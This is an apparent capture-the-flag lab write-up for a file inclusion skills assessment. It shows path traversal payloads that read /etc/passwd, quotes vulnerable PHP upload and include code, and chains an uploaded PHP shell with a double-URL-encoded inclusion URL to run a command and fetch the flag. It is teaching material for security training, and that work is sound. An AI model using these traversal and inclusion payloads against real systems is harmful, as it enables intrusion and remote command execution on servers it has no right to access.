Lab: Skills Assessment - File Inclusion

1. This web application contains form to upload with multipart but its not vuln to LFI
2. This is interesting lab
3. I found am image that load from a specific path : http://154.57.164.81:30911/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c
4. I change the path to : http://154.57.164.81:30911/api/image.php?p=....//....//....//....//...//etc/passwd it gives error connot display image due to error
5. I know invalid image can not be loaded into browser
6. So i visited this path in burp i yes it worked
   <img width="1378" height="662" alt="image" src="https://github.com/user-attachments/assets/d2184df8-ffbe-4d9c-bbcd-759f6fee9313" />

7. Identified which server used its nginx . I triead rce through log poisoning but dont worked
8. I noted that img is inside api i thought to bruteforce directory and i guess what i found /api/application.php it gives details about where files stored and how file name wich is MD5 hashed 
   <?php
    $firstName = $_POST["firstName"];
    $lastName = $_POST["lastName"];
    $email = $_POST["email"];
    $notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;
    
    $tmp_name = $_FILES["file"]["tmp_name"];
    $file_name = $_FILES["file"]["name"];
    $ext = end((explode(".", $file_name)));
    $target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
    move_uploaded_file($tmp_name, $target_file);
    
    header("Location: /thanks.php?n=" . urlencode($firstName));
    ?>
   <img width="1196" height="636" alt="image" src="https://github.com/user-attachments/assets/9b0cffee-b7c2-4590-aebb-f73c677d5f12" />

   so i need to create my file name MD5 hash
   create MD5 hash of my file name shell.php ->
   ┌──(dada㉿dada)-[~/Downloads]
   └─$ md5sum shell.php | cut -d ' ' -f1
     e88d9c921ac17e074964e2c22d780f03


10. SO i visited this 
    <img width="1288" height="482" alt="image" src="https://github.com/user-attachments/assets/a09e1f1c-5eea-454b-afd9-4e0f4caf1d75" />


11. I also found contact.php
    <?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
                </p>

    12. so i visited LFI through /contact.php?region={double url encoded path} witch is (../uploads/e88d9c921ac17e074964e2c22d780f03)
    13. Then i got my flag -> http://154.57.164.78:31605/contact.php?region=%252E%252E%252Fuploads%252Fe88d9c921ac17e074964e2c22d780f03&cmd=cat+/flag_09ebca.txt
        <img width="1271" height="539" alt="image" src="https://github.com/user-attachments/assets/2a7da2e9-5ecc-4cb1-9353-eed204523138" />






